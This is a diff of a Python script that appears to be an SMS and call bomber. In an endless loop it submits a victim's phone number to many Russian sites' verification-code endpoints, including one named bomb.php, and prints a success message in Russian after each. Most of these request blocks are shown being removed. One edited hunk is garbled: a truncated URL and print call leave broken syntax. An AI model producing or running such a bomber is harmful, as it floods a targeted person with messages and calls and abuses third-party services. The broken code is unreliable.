@@ -321,8 +321,8 @@ while True:
 		print('\033[F[-] Не отправлено!')
 
 	try:
-		requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
-		print('\033[F[+] Eda.Yandex отправлено!           ')
+		ser/request_authentication_code',json={"phone_number": "+" + _phone})
+		      ')
 	except:
 		print('\033[F[-] Не отправлено!')
 
@@ -352,57 +352,4 @@ while True:
 
 	try:
 		requests.get('https://findclone.ru/register', data={"phone": _phone})
-		print('\033[F[+] Findclone отправлено!           ')
-	except:
-		print('\033[F[-] Не отправлено!')
-
-	try:
-		requests.post("https://apteka366.ru/login/register/sms/send", data={"phone": _phone})
-		print('\033[F[+] apteka366 отправлено!           ')
-	except:
-		print('\033[F[-] Не отправлено!')
-
-	try:
-		requests.post('https://api.fex.net/api/v1/auth/scaffold', data={"phone": _phone})
-		print('\033[F[+] Fex отправлено!           ')
-	except:
-		print('\033[F[-] Не отправлено!')
-
-	try:
-		requests.post('https://api.ennergiia.com/auth/api/development/lor', data={"phone": _phone})
-		print('\033[F[+] ennergiia отправлено!           ')
-	except:
-		print('\033[F[-] Не отправлено!')
-
-	try:
-		requests.post('http://greadios.beget.tech/bomb.php', data={"number": _phone})
-		print('\033[F[+] greadios отправлено!           ')
-	except:
-		print('\033[F[-] Не отправлено!')
-
-	try:
-		requests.post('https://www.stoloto.ru/send-mobile-app-link', data={"phone": _phone})
-		print('\033[F[+] stoloto отправлено!           ')
-	except:
-		print('\033[F[-] Не отправлено!')
-
-	try:
-		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
-		print('\033[F[+] findclone звонок отправлен!           ')
-	except:
-		print('\033[F[-] Не отправлено!')
-
-	try:
-		requests.post('https://gorzdrav.org/login/register/sms/send', data={"phone": _phone})
-		print('\033[F[+] gorzdrav отправлено!           ')
-	except:
-		print('\033[F[-] Не отправлено!')
-
-
-
-	try:
-		iteration += 1
 		
-	except:
-		break
-
